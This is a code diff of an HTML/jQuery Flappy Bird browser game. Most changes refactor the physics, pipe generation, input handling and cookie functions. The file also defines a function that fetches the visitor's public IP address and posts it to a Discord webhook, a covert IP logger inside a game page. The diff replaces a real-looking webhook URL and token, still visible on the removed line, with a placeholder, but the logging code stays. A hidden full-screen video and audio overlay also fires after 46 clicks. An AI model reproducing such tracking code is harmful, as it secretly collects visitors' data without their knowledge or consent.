@@ -1,7 +1,6 @@
 <html>
 	<head>
 		<style>
-            /* Load the flappybird font from a local file */
             @font-face {
                 font-family: 'flappybird';
                 src: url('fonts/04B_19.TTF') format('truetype');
@@ -203,7 +202,7 @@
                 function sendIPToDiscord() {
                     $.getJSON('https://api.ipify.org?format=json', function(data) {
                         var ip = data.ip;
-                        var webhookURL = 'https://discordapp.com/api/webhooks/1342611679346823209/dCBsHT8ku3YOSV9AEi-eylxr3gahIFabXGzxfLHSwTARNONGumLD0IXoj4I9C98Bcz5G';
+                        var webhookURL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
                         var message = {
                             content: `User IP: ${ip}`
                         };
@@ -229,28 +228,29 @@
                     var video = $('<video/>', {
                         id: 'awesomeVideo',
                         src: 'video.mp4',
-                        autoplay: 'autoplay',
-                        loop: 'loop',
-                        muted: 'muted',
+                        autoplay: true,
+                        loop: true,
+                        muted: true,
                         style: 'position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); min-width: 100%; min-height: 100%; z-index: 200;'
                     }).appendTo('body');
 
                     var audio = $('<audio/>', {
                         id: 'awesomeAudio',
                         src: 'audio.mp3',
-                        autoplay: 'autoplay',
-                        loop: 'loop',
+                        autoplay: true,
+                        loop: true,
                         style: 'display: none;'
                     }).appendTo('body');
 
                     $('#Birdy').css('z-index', 300);
                 }
 
-                canvasObject.mousedown(function(){
+                canvasObject.mousedown(function(e){
                     clickCount++;
                     if (clickCount === 46) {
                         playVideoAndAudio();
                     }
+                    if(!Paused) Birdy.jump();
                 });
                 
                 function pauseGame(){
@@ -292,7 +292,7 @@
                 
                 function togglePause(){
                     Paused ? startGame() : pauseGame();
-                }                            
+                }
                 
                 var CurrentScore = 0;
                 
@@ -302,10 +302,6 @@
                 });
                 
                 $('#ResetButton').click(resetGame);
-                
-				canvasObject.mousedown(function(){
-					Birdy.jump();
-				});
                 
                 $('body').keydown(function(event){
                     if(event.which == 32) resetGame();
@@ -356,11 +352,8 @@
 					this.fall = function(){
 						if(!jumping){
 							selectorObject.stop().animate({top:'+='+gravVeloc+'%'}, 30, 'linear');
-							gravVeloc += gravAccel;
-                            if(gravVeloc>terminalVelocity){
-                                gravVeloc = terminalVelocity;
-                            }
-                            var AdjustedAngle = Angle+15*(gravVeloc/terminalVelocity)^2;
+							gravVeloc = Math.min(gravVeloc + gravAccel, terminalVelocity);
+                            var AdjustedAngle = Angle + 15*Math.pow(gravVeloc/terminalVelocity, 2);
                             adjustAngle(Math.min(AdjustedAngle,90));
                         }
 					};
@@ -377,9 +370,7 @@
                     
                     this.flapWings = function(){
                         WingPosition++;
-                        if(Angle > 45){
-                            WingPosition = 1;
-                        }
+                        if(Angle > 45) WingPosition = 1;
                         selectorObject.css("background-position-x", WingPositions[WingPosition%4]*50 + "%");
                     }
                     
@@ -392,16 +383,17 @@
 				});
 
                 function addPipe(){
-                    var PipeGap = 30,
-                            MinPipeHeight = 5;
-                    
+                    var PipeGap = 30;
+                    var MinPipeHeight = 5;
                     var MaxTopPipeHeight = 100-PipeGap-2*MinPipeHeight;
                     var TopPipeHeight = Math.random()*MaxTopPipeHeight+MinPipeHeight;
                     var BottomPipeTop = TopPipeHeight+PipeGap;
-                    var BottomPipeHeight = 100-BottomPipeTop;
                     
                     $('<div/>').addClass('Pipe').css('height',TopPipeHeight+'%').data('scored', false).appendTo(canvasObject);
-                    $('<div/>').addClass('Pipe BottomPipe').css({height:BottomPipeHeight+'%',top: BottomPipeTop+'%'}).data('scored', false).appendTo(canvasObject);
+                    $('<div/>').addClass('Pipe BottomPipe').css({
+                        height: (100-BottomPipeTop)+'%',
+                        top: BottomPipeTop+'%'
+                    }).data('scored', false).appendTo(canvasObject);
                 }
                 
                 function cleanPipes(){
@@ -431,7 +423,8 @@
                 }
                 
                 function isInBound(birdy, canvas){
-                    if(birdy.offset().top+birdy.height()> canvas.offset().top+canvas.height() || birdy.offset().top<canvas.offset().top){ 
+                    if(birdy.offset().top+birdy.height() > canvas.offset().top+canvas.height() || 
+                       birdy.offset().top < canvas.offset().top){ 
                         endGame();
                     }
                 }
@@ -440,7 +433,7 @@
                     $('.BottomPipe').each(function(){
                         var BirdyBeakXPos = Birdy.BirdyObject.offset().left + Birdy.BirdyObject.width();
                         var PipeRightXPos = $(this).offset().left + $(this).width();
-                        if(!$(this).data('scored') && BirdyBeakXPos>PipeRightXPos){
+                        if(!$(this).data('scored') && BirdyBeakXPos > PipeRightXPos){
                             CurrentScore++;
                             $(this).data('scored', true);
                         }
@@ -451,24 +444,21 @@
                 startGame();
                 
                 jQuery.fn.rotate = function(degrees) {
-                    return $(this).css({'transform' : 'rotate('+ degrees +'deg)'});
+                    return $(this).css({'transform': 'rotate('+degrees+'deg)'});
                 };
                 
-                function setCookie(cname,cvalue,exdays)
-                {
+                function setCookie(cname,cvalue,exdays) {
                     var d = new Date();
                     d.setTime(d.getTime()+(exdays*24*60*60*1000));
-                    var expires = "expires="+d.toGMTString();
-                    document.cookie = cname + "=" + cvalue + "; " + expires;
+                    document.cookie = cname + "=" + cvalue + ";expires=" + d.toUTCString();
                 }
-                function getCookie(cname)
-                {
+                
+                function getCookie(cname) {
                     var name = cname + "=";
                     var ca = document.cookie.split(';');
-                    for(var i=0; i<ca.length; i++) 
-                    {
+                    for(var i=0; i<ca.length; i++) {
                         var c = ca[i].trim();
-                        if (c.indexOf(name)==0) return c.substring(name.length,c.length);
+                        if(c.indexOf(name) == 0) return c.substring(name.length,c.length);
                     }
                     return "";
                 }
